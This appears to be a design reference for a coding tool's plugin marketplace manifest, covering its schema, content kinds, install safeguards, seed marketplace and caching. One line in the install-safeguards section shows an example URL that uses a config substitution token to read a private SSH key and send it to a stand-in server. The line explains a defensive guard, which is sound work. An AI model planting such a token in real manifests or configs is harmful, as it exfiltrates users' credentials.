# Marketplace manifest

Technical reference for the Lunos marketplace manifest format (XCOD-8, child of the
marketplace epic XCOD-7). Originally plugin-only; XCOD-69 added MCP servers and XCOD-72 made
plugins, skills, hooks and MCP servers four typed content kinds in one manifest. Discovery,
caching and install flows are described in the later sections.

## Overview

- A marketplace is a single JSON manifest listing installable content of four kinds, each in its
  own typed array: `plugins` (required), and optionally `skills`, `hooks` and `mcp`. See
  [Content kinds](#content-kinds).
- Modeled loosely on Claude Code's `.claude-plugin/marketplace.json`, scoped down for v1.
- v1 supports exactly two plugin source types: `npm` and `github`. `archive`, `command`,
  `git-subdir` sources, and cross-marketplace dependencies are explicitly out of scope for
  this pass.
- Validated with an Effect Schema class (`Marketplace.Manifest`), consistent with how the
  rest of `packages/core/src/config` validates configuration — not Zod/JSON-schema.
- Type and validator live in `packages/core/src/marketplace.ts`, not under
  `packages/core/src/config/` — a marketplace manifest is a distinct artifact from the
  `opencode.json`/`.opencode` config tree that `Config.Info` describes.

## Manifest location

- **Local marketplace:** `.opencode/marketplace.json`, following this fork's established
  config-directory convention (the same `.opencode` directory `tui.json` and plugin files
  already live in).
- **Remote marketplace:** fetched from a git repository or URL, expected at `marketplace.json`
  in the repository root — the direct mirror of the local `.opencode/marketplace.json`
  convention above, so the same file works whether it's read from a local checkout or a
  remote clone. This spec fixes the manifest's own shape and this location convention;
  the actual fetch/install implementation is downstream epic work, not part of this story.

## Manifest schema

```json
{
  "name": "lunos-community",
  "owner": {
    "name": "Lunos Community",
    "url": "https://github.com/lunos-community"
  },
  "description": "Community-curated plugins for Lunos.",
  "version": "1.0.0",
  "plugins": [
    {
      "name": "conventional-commits",
      "source": {
        "type": "npm",
        "package": "@lunos-community/conventional-commits",
        "version": "^1.2.0"
      },
      "description": "Enforces Conventional Commits message format.",
      "author": "Lunos Community",
      "category": "git",
      "tags": ["git", "commits"]
    },
    {
      "name": "rust-analyzer-bridge",
      "source": {
        "type": "github",
        "repo": "lunos-community/rust-analyzer-bridge",
        "ref": "v2"
      },
      "description": "Bridges rust-analyzer diagnostics into Lunos.",
      "category": "lsp"
    }
  ]
}
```

### Top-level fields

| Field         | Required | Type                    | Notes                                                                                                                                                                                                                                   |
| ------------- | -------- | ----------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `$schema`     | no       | `string`                | JSON schema reference, matching `opencode.json`/`tui.json` convention. No schema is published/hosted for this format yet — the field is supported for when one exists, and omitted from the example above to avoid implying a live URL. |
| `name`        | yes      | `string`                | Marketplace identifier.                                                                                                                                                                                                                 |
| `owner`       | yes      | `object`                | See below.                                                                                                                                                                                                                              |
| `description` | no       | `string`                |                                                                                                                                                                                                                                         |
| `version`     | no       | `string`                |                                                                                                                                                                                                                                         |
| `plugins`     | yes      | array of plugin entries | May be empty.                                                                                                                                                                                                                           |
| `skills`      | no       | array of skill entries  | XCOD-72. See [Skill entry](#skill-entry).                                                                                                                                                                                               |
| `hooks`       | no       | array of hook entries   | XCOD-72. See [Hook entry](#hook-entry).                                                                                                                                                                                                 |
| `mcp`         | no       | array of MCP entries    | XCOD-69. See [MCP entry](#mcp-entry).                                                                                                                                                                                                   |

### `owner`

| Field   | Required | Type     |
| ------- | -------- | -------- |
| `name`  | yes      | `string` |
| `email` | no       | `string` |
| `url`   | no       | `string` |

### Plugin entry

| Field         | Required | Type              | Notes      |
| ------------- | -------- | ----------------- | ---------- |
| `name`        | yes      | `string`          |            |
| `source`      | yes      | tagged union      | See below. |
| `description` | no       | `string`          |            |
| `version`     | no       | `string`          |            |
| `author`      | no       | `string`          |            |
| `category`    | no       | `string`          |            |
| `tags`        | no       | array of `string` |            |

### `source` (tagged on `type`)

Exactly two shapes are valid in v1:

```json
{ "type": "npm", "package": "@scope/name", "version": "1.2.3" }
```

```json
{ "type": "github", "repo": "org/name", "ref": "v2" }
```

| Type     | Field     | Required | Type     | Notes                                                                |
| -------- | --------- | -------- | -------- | -------------------------------------------------------------------- |
| `npm`    | `package` | yes      | `string` | npm package name.                                                    |
| `npm`    | `version` | no       | `string` | Defaults to latest.                                                  |
| `github` | `repo`    | yes      | `string` | `org/name` form.                                                     |
| `github` | `ref`     | no       | `string` | Branch, tag, or commit. Defaults to the repository's default branch. |

Any other `type` value fails validation — see [Validation errors](#validation-errors).

## Content kinds

The four kinds live in **parallel typed arrays**, not one list tagged with a `kind` field.
`plugins` predates the others and stays required, so every manifest published before XCOD-69/72
keeps validating unchanged. The other three are optional, and an older Lunos that doesn't know an
array simply ignores it (Effect Schema drops unknown keys on decode). A manifest can therefore add
skills, hooks or MCP servers without breaking any existing client.

Validation fails the **whole manifest**, not one row, so each entry's shape is deliberately
permissive about things that change between Lunos versions (see the hook `event` below).

Across every kind, `name`, `description`, `category` and `tags` mean the same thing and are what
`marketplace search`, `plugin search`, `mcp search` and the TUI Discover view match a query
against (case-insensitive substring).

### Skill entry

A skill entry describes a **skill source**, not a single skill.

| Field         | Required | Type              | Notes                                                                      |
| ------------- | -------- | ----------------- | -------------------------------------------------------------------------- |
| `name`        | yes      | `string`          |                                                                            |
| `url`         | yes      | `string`          | Base URL serving `index.json`, exactly as config `skills.urls` accepts it. |
| `description` | no       | `string`          |                                                                            |
| `category`    | no       | `string`          |                                                                            |
| `tags`        | no       | array of `string` |                                                                            |

Installing appends `url` to config `skills.urls`. That pulls **every** skill the source's
`index.json` lists, now and as the source changes. Config has no per-skill filter, so the manifest
can't honestly describe one skill. The install preview fetches the index and lists what the
source serves at that moment, and says so if the index can't be read.

### Hook entry

| Field         | Required | Type               | Notes                                                                                 |
| ------------- | -------- | ------------------ | ------------------------------------------------------------------------------------- |
| `name`        | yes      | `string`           | Manifest-side label only; config hooks have no name.                                  |
| `event`       | yes      | `string`           | One of `ConfigHooks.Event` (`packages/core/src/config/hooks.ts`), checked at install. |
| `command`     | yes      | array of `string`  | Command and arguments. Not passed through a shell.                                    |
| `matcher`     | no       | `{ tool?, file? }` | Globs, as in config hooks.                                                            |
| `environment` | no       | array of `string`  | Variable **names** only. Never values.                                                |
| `timeout`     | no       | `number`           | Milliseconds.                                                                         |
| `description` | no       | `string`           |                                                                                       |
| `category`    | no       | `string`           |                                                                                       |
| `tags`        | no       | array of `string`  |                                                                                       |

`event` is a plain string in the manifest, **not** the `ConfigHooks.Event` literal union. A strict
enum would make an older Lunos reject the whole manifest, every plugin in it included, the day a
marketplace publishes a hook for an event that version doesn't know. The event is checked when
that one hook is installed instead, and an unknown event is refused, because config silently
ignores hooks under an event it doesn't dispatch (XCOD-68): unchecked, the hook would install and
never fire.

Installing appends `{ command, matcher?, environment?, timeout? }` to `hooks.<event>`. An existing
hook under the same event with the same `command` and `matcher` is refused as a duplicate, since
there is no name to key on.

### MCP entry

A tagged union on `type`, mirroring config `mcp`:

| Type     | Field         | Required | Type              | Notes                                  |
| -------- | ------------- | -------- | ----------------- | -------------------------------------- |
| `local`  | `command`     | yes      | array of `string` | Command and arguments.                 |
| `local`  | `environment` | no       | array of `string` | Variable **names** only. Never values. |
| `local`  | `cwd`         | no       | `string`          |                                        |
| `remote` | `url`         | yes      | `string`          |                                        |
| `remote` | `headers`     | no       | array of `string` | Header **names** only. Never values.   |

Both shapes also take `name` (required), `description`, `category` and `tags`. Installing writes
config `mcp.<name>`, refusing if that key already exists (even as a bare `{ enabled: false }`).

### Installing: what every kind guarantees

`lunos marketplace install <name> [--kind] [--yes]`, `lunos mcp add <name>`, `lunos plugin add
<name>` and the TUI Discover view all install through the same code, so they refuse the same
things:

- **Plugins** hand their `source` (as an npm / `owner/repo#ref` spec) to the existing plugin
  install path, which reads the package's own manifest.
- **Skill sources, hooks and MCP servers** go through one planner,
  `packages/opencode/src/marketplace/install.ts`. It shows what the entry will run, connect to or
  fetch, and the config file it will write, before the user confirms. Marketplace installs always
  write **global** config.
- **Variables are written as references.** Declared environment/header names become
  `{env:NAME}`, so the generated config holds no secret. Environment names must be shell
  identifiers (`[A-Za-z_][A-Za-z0-9_]*`); header names may also contain `-`.
- **No config substitution tokens.** `ConfigVariable.substitute` runs over the whole config text,
  keys included, expanding `{env:…}` and then `{file:…}`. A manifest string written verbatim could
  otherwise read a local file at load time and send it to the manifest author's server (e.g. a url
  `https://x/?k={file:~/.ssh/id_rsa}`). Any `name`, `url`, `command`, `cwd` or `matcher` containing
  `{env:` or `{file:` is refused (`packages/opencode/src/marketplace/guard.ts`).

## Validation errors

`Marketplace.decode` (`Schema.decodeUnknownSync(Marketplace.Manifest)`) throws a descriptive
`ParseError` naming the failing field path and what was expected. For example, an
unsupported source `type`:

```json
{ "type": "archive", "url": "https://example.com/plugin.tar.gz" }
```

produces:

```
Expected { readonly "type": "npm", ... } | { readonly "type": "github", ... }, got {"type":"archive","url":"https://example.com/plugin.tar.gz"}
  at ["plugins"][0]["source"]
```

## Seed marketplace (community plugins)

`marketplace.json` at the repository root (XCOD-9) is the default community marketplace,
converted from `packages/web/src/content/docs/ecosystem.mdx`'s "Plugins" table. It's reachable
at a fixed location — `https://raw.githubusercontent.com/AxsionDev/Lunos/dev/marketplace.json (`lunos marketplace add AxsionDev/Lunos`)` —
for a fresh install to add without hunting for a source, per this doc's manifest-location
convention above. `ecosystem.mdx` itself is unchanged; the seed manifest is a second,
structured artifact derived from the same data, not a replacement for the docs page.

Mapping decisions:

- **Every plugin uses an `npm` source.** The seed was first built with 36 `github` sources, one
  per linked repository, and none of them installed: `github` sources go through npm's
  git-dependency path, which npm 12 disables by default (`allow-git=none`) and which Arborist can't
  prepare for repositories with a build step or `workspace:*` dependencies. A core test
  (`packages/core/test/marketplace.test.ts`) now fails if any plugin in this file isn't `npm`.
- **An npm package is only used when it's published by the linked repository's owner**, checked
  against `npm view <pkg> repository.url` or `maintainers`. A matching name is not enough: 4 of the
  candidates' npm names belong to a different author, and switching those would install a
  stranger's code. The npm name often differs from the entry name (e.g.
  `opencode-dynamic-context-pruning` → `@tarquinen/opencode-dcp`).
- **25 of the table's 38 "Plugins" rows are included. 13 are excluded:**
  - **Monorepo subdirectories (2):** `opencode-daytona`
    (`daytona/integrations/tree/main/packages/opencode-plugin`) and `@plannotator/opencode`
    (`backnotprop/plannotator/tree/main/apps/opencode-plugin`) link to a subdirectory of a larger
    repository. There's no subpath field (`git-subdir` sources are deferred past v1, see Overview).
  - **Not published on npm (6):** `opencode-type-inject`, `opencode-morph-fast-apply`,
    `opencode-notificator`, `opencode-workspace`, `opencode-firecrawl`, `opencode-tavily`.
  - **npm name published by a different author (4):** `opencode-shell-strategy`,
    `opencode-worktree`, `opencode-background-agents`, `opencode-notify`.
  - **npm package the installer can't load (1):** `opencode-google-antigravity-auth` declares only
    a `module` field, and the plugin installer reads `main`/`exports`.
- **"Projects" and "Agents" sections excluded entirely:** those rows (a Discord bot, editor
  frontends, a mobile client, agent/prompt configs, etc.) aren't installable Lunos/opencode
  plugins — they're separate tools and integrations built around the ecosystem, which is why
  `ecosystem.mdx` lists them under different headings in the first place.
- **Before adding an entry, install it for real** (`lunos marketplace install <name> --yes` in a
  throwaway `HOME`). Schema validation and unit tests don't catch a package that won't install.
- `category` and `tags` are omitted throughout — `ecosystem.mdx`'s table doesn't carry that
  data, and the schema doesn't require it.
- **MCP servers (XCOD-69):** seven `mcp` entries — six official reference servers (memory,
  sequential-thinking, fetch, time, git, everything) and the remote context7 docs server.
  `filesystem` is left out: it needs a user-chosen path argument a static manifest can't supply.
- **No seed skills or hooks yet.** XCOD-72 provides the schema and install path; curated content
  for those kinds belongs to the stories that own them.

## Marketplace cache (XCOD-13)

Resolved manifests are cached to disk so `lunos marketplace list`, `plugin list`/`search`, and the
TUI Discover view (XCOD-11, XCOD-12) all read from cache instead of re-fetching independently —
following the same on-disk cache precedent as `@opencode-ai/core`'s npm plugin install cache
(`Npm.add`, keyed under `Global.Path.cache`) and its `models-dev` catalog cache (`Hash.fast(source)`

- file mtime as the freshness clock), rather than inventing a new cache location or format.

* **Location:** `~/.cache/opencode/marketplace/<hash>.json`, one file per added source, where
  `<hash>` is `Hash.fast(source)` (`packages/core/src/util/hash.ts`, sha1) of the source string
  exactly as configured (owner/repo shorthand, URL, or normalized local path).
* **Format:** the resolved `Marketplace.Manifest` JSON as-is — no wrapper object. The file's mtime
  doubles as `fetchedAt`, so there's nothing else to keep in sync.
* **Freshness policy (v1):** a cache hit younger than 24 hours is served with no network or file
  fetch at all. Once it's older than that, the next read attempts one live re-fetch: success
  rewrites the cache; failure falls back to the existing (now-stale) cached manifest rather than
  failing the read. This is the "refresh in the background on a timer" policy this manifest-spec's
  Overview deferred to a later story, implemented lazily on read rather than as a background fiber.
* **Local `path` sources bypass the cache entirely** and are always read live, mirroring how
  `resolvePluginTarget` (`packages/opencode/src/plugin/shared.ts`) caches npm plugin installs but
  reads file-plugin paths straight off disk every time. A local directory/file has no network
  round-trip to save and can't go "unreachable but last-known-good" the way a URL or GitHub source
  can.
* **Explicit refresh:** `lunos marketplace update <name>` (accepts either the configured source or
  the manifest's declared `name`) bypasses the freshness check and forces a re-fetch. On failure it
  leaves the on-disk cache untouched and reports the error — the last-known-good manifest keeps
  being served by `list`/`search`/Discover.
* **Unreachable sources:** a source that fails its live re-fetch (via the lazy TTL check above, or
  via `marketplace update`) but has a prior successful cache continues to resolve successfully, with
  a `stale` field carrying the failure reason. Callers surface this as a visible "refresh failed,
  showing cache from <time>" indicator rather than silently degrading or erroring the whole command.
  A source with no successful fetch ever (nothing cached yet) still fails outright — there is no
  last-known-good to fall back to.
* **Implementation:** `packages/opencode/src/marketplace/shared.ts` (`resolveWithCache`,
  `resolveAddedMarketplaces`, `refreshMarketplaceCache`).

## Current in-repo examples

- Valid manifest: `packages/core/test/fixtures/marketplace/valid.json`
- Valid manifest with MCP servers: `packages/core/test/fixtures/marketplace/valid-mcp.json`
- Valid manifest with all four kinds: `packages/core/test/fixtures/marketplace/valid-all-kinds.json`
- Malformed manifest (unsupported source type): `packages/core/test/fixtures/marketplace/malformed.json`
- Seed community marketplace: `marketplace.json` (repository root)
- Schema and validator: `packages/core/src/marketplace.ts`
- Listing and install: `packages/opencode/src/marketplace/{content,install,guard}.ts`
- Tests: `packages/core/test/marketplace.test.ts`, `packages/opencode/test/marketplace/shared.test.ts`,
  `packages/opencode/test/marketplace/install.test.ts`, `packages/opencode/test/cli/marketplace-content.test.ts`,
  `packages/opencode/test/cli/tui/marketplace-discover.test.ts`
